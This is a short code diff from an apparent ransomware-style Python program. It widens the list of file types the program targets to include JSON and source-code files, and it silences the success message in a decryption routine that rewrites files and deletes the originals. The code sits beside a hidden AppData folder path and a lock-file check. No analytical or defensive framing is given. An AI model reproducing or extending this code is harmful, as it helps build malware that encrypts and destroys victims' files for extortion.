@@ -17,7 +17,7 @@ from tkinter import ttk
 __rmfolderPath = f"C:/Users/{os.getlogin()}/AppData/Local/bkms/"
 testPath = "./data/"
 
-patterns = ['*.xlsx', '*.docx', '*.doc', '*.pptx', '*.jpeg', '*.png', '*.gif', '*.sql', '*.ai',"*.pdf"]
+patterns = ['*.xlsx', '*.docx', '*.doc', '*.pptx', '*.jpeg', '*.png', '*.gif', '*.sql', '*.ai',"*.pdf","*.json","*.c","*.cpp","*.java","*.js","*.py"]
 
 def checkfile():
     rmfilePath = os.path.join(testPath, "lock.json")
@@ -203,7 +203,7 @@ def runDecryption(tk_root, privateKey):
             with open(new_file_path, "wb") as decrypted_file:
                 decrypted_file.write(decrypted_data)
             os.remove(file_path)
-            print(f"Decrypted {file_path} successfully.")
+            #print(f"Decrypted {file_path} successfully.")
         except Exception as e:
             print(f"Error decrypting file {file_path}: {e}")
 
